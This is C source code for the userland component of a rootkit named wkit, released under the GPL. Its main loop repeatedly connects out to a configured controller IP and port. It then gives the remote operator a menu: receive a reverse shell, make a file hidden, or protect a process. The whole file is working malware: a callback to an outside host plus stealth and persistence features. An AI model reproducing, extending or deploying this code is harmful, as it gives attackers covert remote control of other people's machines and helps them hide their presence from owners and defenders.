/*
 * wkit | userland binary for wkit rootkit 
 * written by ngn (https://ngn.tf) (2024)
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.
 *
*/

#include "../inc/config.h"
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <arpa/inet.h>
#include <stdbool.h>
#include <string.h>
#include <stdarg.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <stdio.h>

#define eq(s1, s2) strcmp(s1, s2)==0
#include "util.h"
#include "cmds.h"

int handle(int s){
  ssend(s, RED"          _    _ _\n"RESET);
  ssend(s, RED"__      _| | _(_) |_\n"RESET);
  ssend(s, RED"\\ \\ /\\ / / |/ / | __|\n"RESET);
  ssend(s, RED" \\ V  V /|   <| | |_\n"RESET);
  ssend(s, RED"  \\_/\\_/ |_|\\_\\_|\\__|\n"RESET);
  ssend(s, "\n");

  info(s, "Connection successful");
  info(s, "Sending the command menu");
  ssend(s, BOLD RED"1"RESET BOLD" -> Receive reverse shell connection"  RESET"\n");
  ssend(s, BOLD RED"2"RESET BOLD" -> Make a file hidden"                RESET"\n");
  ssend(s, BOLD RED"3"RESET BOLD" -> Protect a process"                 RESET"\n");

PROMPT:
  prompt(s);
  char* op = recvline(s);
  if(NULL==op)
    return -1;

  if(strlen(op)==0)
    ssend(s, "\n");

  int opt = atoi(op);

  switch(opt){
    case 1:
      cmd_shell(s);
      break;
    case 2:
      cmd_hide(s);
      break;
    case 3:
      cmd_pid(s);
      break;
    default:
      error(s, "Invalid option!");
      free(op);
      goto PROMPT;
      break;
  }

  free(op);
  return 0;
}

int try(void){
  struct sockaddr_in addr;
  int s = socket(AF_INET, SOCK_STREAM, 0);
  
  addr.sin_family = AF_INET;       
  addr.sin_port = htons(PORT);
  addr.sin_addr.s_addr = inet_addr(IP);
  int ret = connect(s, (struct sockaddr *) &addr, 
    sizeof(addr));

  if(ret != 0){
    close(s);
    return -1;
  }

  printf("Got connection, calling handle\n");
  handle(s);
  printf("Closing connection\n");
  close(s);
}

int main(void){
  try();
  while(true){
    sleep(5);
    try();
  }
  return 0;
}
